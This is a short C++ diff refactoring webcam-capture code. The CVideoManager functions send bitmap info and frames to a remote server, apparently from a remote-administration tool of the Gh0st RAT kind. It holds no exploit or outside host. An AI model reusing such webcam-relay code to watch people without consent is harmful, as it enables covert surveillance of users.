@@ -83,25 +83,21 @@ void CVideoManager::Destroy()
 
 void CVideoManager::SendBitMapInfor()
 {
-	DWORD	dwBytesLength = 1 + sizeof(BITMAPINFO);
-	LPBYTE	szBuffer = new BYTE[dwBytesLength];
-	if (szBuffer == NULL)
-		return;
-
-	szBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;   //+ ͷ
+	const int	dwBytesLength = 1 + sizeof(BITMAPINFO);
+	BYTE szBuffer[dwBytesLength + 3] = { 0 };
+	szBuffer[0] = TOKEN_WEBCAM_BITMAPINFO;
 	memcpy(szBuffer + 1, m_CapVideo.GetBmpInfor(), sizeof(BITMAPINFO));
-	m_ClientObject->OnServerSending((char*)szBuffer, dwBytesLength);	
-	delete [] szBuffer;		
+	m_ClientObject->OnServerSending((char*)szBuffer, dwBytesLength);
 }
 
 void CVideoManager::SendNextScreen()
 {
 	DWORD dwBmpImageSize=0;
-	LPVOID	lpDIB =m_CapVideo.GetDIB(dwBmpImageSize); //m_pVideoCap->GetDIB();
+	LPVOID	lpDIB =m_CapVideo.GetDIB(dwBmpImageSize);
 	// token + IsCompress + m_fccHandler + DIB
 	int		nHeadLen = 1 + 1 + 4;
 
-	UINT	nBufferLen = nHeadLen + dwBmpImageSize;//m_pVideoCap->m_lpbmi->bmiHeader.biSizeImage;
+	UINT	nBufferLen = nHeadLen + dwBmpImageSize;
 	LPBYTE	lpBuffer = new BYTE[nBufferLen];
 
 	lpBuffer[0] = TOKEN_WEBCAM_DIB;
